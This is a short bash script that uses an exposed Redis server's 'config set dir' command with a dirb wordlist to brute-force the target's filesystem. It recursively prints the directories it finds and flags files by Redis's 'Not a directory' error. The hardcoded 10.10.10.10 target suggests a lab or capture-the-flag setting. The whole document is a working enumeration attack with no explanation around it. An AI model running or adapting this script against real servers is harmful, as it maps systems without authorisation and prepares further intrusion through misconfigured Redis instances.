#!/bin/bash
input="/usr/share/dirb/wordlists/common.txt"
ip="10.10.10.10"
recurse() {
	while IFS= read -r VAR
	do
	FOLDER=$(redis-cli -h $ip config set dir $1/$VAR | head -c 2)
        FOLDER2=$(redis-cli -h $ip config set dir $1/$VAR$2  | tail -c 17 | head -c 15)
	if [ 0 != ${#VAR} ] && [ "OK" == "$FOLDER" ]; then
		echo $1/$VAR
		recurse "$1/$VAR/"
	fi
	VAR2=$VAR$2
	if [ 0 != ${#VAR2} ] && [ "Not a directory" == "$FOLDER2" ]; then
		echo "FILE: "
		echo $1/$VAR$2
	fi

	done < "$input"


}

recurse /$1 $2



